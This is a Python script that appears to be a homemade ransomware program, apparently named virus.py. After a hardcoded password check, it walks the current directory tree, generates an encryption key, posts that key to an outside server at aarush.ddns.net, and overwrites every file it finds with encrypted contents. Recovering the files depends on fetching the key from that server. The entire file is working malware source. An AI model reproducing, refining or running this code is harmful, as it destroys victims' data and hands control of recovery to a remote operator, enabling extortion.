#!/usr/bin/env python3

import os
import requests
from cryptography.fernet import Fernet
import uuid

files = []
password = "aarush"

# Prompt for user password
user_password = input("Enter the password to continue:\n")

if user_password != password:
    print("Incorrect password. Exiting.")
    exit()  # Exit if the password is incorrect

# Collecting all files that are not the script or key files
for root, dirs, filenames in os.walk("."):
    for file in filenames:
        if file in ("virus.py", "thekey.key", "fix.py"):
            continue  # Skip these specific files
        full_path = os.path.join(root, file)
        files.append(full_path)

# Generate the encryption key
key = Fernet.generate_key()

# Send the key to a remote server
server_url = 'https://aarush.ddns.net/key/store_key'
try:
    response = requests.post(server_url, data=key)  # Send raw bytes
    if response.status_code == 200:
        print(response.text)  # Display unique ID
        
        print("Please go to aarush.ddns.net/key and enter the key above then save it to a file called thekey.key in the directory you ran this script\n")
    else:
        print(f"Failed to send the key to the server. Status Code: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Error sending key to server: {e}")

# Encrypt files
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted: {file}")
    except Exception as e:
        print(f"Failed to encrypt {file}: {e}")
